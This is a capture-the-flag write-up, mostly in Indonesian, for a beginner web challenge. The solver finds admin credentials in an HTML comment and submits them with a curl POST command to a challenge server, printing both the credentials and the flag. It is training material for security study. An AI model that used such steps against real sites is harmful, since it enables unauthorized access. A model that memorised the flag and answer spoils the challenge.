# POST Practice

## Deskripsi 

This website requires authentication, via POST. However, it seems as if someone has defaced our site. Maybe there is still some way to authenticate? [Link](http://165.227.106.113/post.php)

---

## Analisis 

Saat mengakses halaman `post.php` melalui browser, ditampilkan pesan berikut:

![Web.png](Web.png)

Pesan tersebut mengindikasikan bahwa server mengharapkan data melalui **metode POST**, namun belum menerima parameter yang dibutuhkan.

Dengan melakukan _view page source_, ditemukan komentar HTML yang berisi informasi sensitif:

```html
<h1>This site takes POST data that you have not submitted!</h1>
<!-- username: admin | password: 71urlkufpsdnlkadsf -->
```

Komentar ini mengungkapkan kredensial yang valid yang dikirim sebagai **POST parameter**.

---

## Eksploit

Untuk mengirim data POST yang sesuai, digunakan tool `curl` melalui _CLI_ dengan menyertakan parameter `username` dan `password` di body request:

```bash
curl -X POST http://165.227.106.113/post.php \
  -d "username=admin&password=71urlkufpsdnlkadsf"
```

Output:
```html
<h1>flag{p0st_d4t4_4ll_d4y}</h1>
```

---

## Flag

```flag{p0st_d4t4_4ll_d4y}```
